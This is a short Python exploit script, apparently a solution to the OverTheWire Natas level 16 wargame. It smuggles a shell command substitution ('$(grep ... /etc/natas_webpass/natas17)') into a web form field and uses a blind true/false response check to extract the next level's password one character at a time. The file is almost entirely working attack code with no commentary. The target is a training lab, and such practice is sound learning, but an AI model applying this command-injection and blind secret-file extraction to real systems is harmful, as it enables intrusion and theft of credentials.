import subprocess
import re
import requests
import string
from requests.auth import HTTPBasicAuth

passw = subprocess.run(['getpass', '16'], stdout=subprocess.PIPE).stdout.decode('utf-8')
temp_alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits

def build_alphabet(alpha):
    cused = ""
    for char in alpha:
        #print('cused: ' + cused)
        if inject_payload({'needle':'$(grep ' + char + ' /etc/natas_webpass/natas17)bushelled'}):
            cused += char
            
    return cused

def build_payload(curr_pass):
    payload = '$(grep ^' + curr_pass + ' /etc/natas_webpass/natas17)bushelled'
    data = {'needle':payload}
    return data

def inject_payload(payload):
    r = requests.post('http://natas16.natas.labs.overthewire.org/', auth=HTTPBasicAuth('natas16', passw.strip()), data=payload);
    if not "bushelled" in r.text:
        return True
    return False

if __name__ == "__main__":
    password = "" 
    alphabet = build_alphabet(temp_alphabet)
    while len(password) != 32:
        #print('...')
        for char in alphabet:
            if inject_payload(build_payload(password+char)):
                password += char
                #print('pass: ' + password)
                break
    print(password)
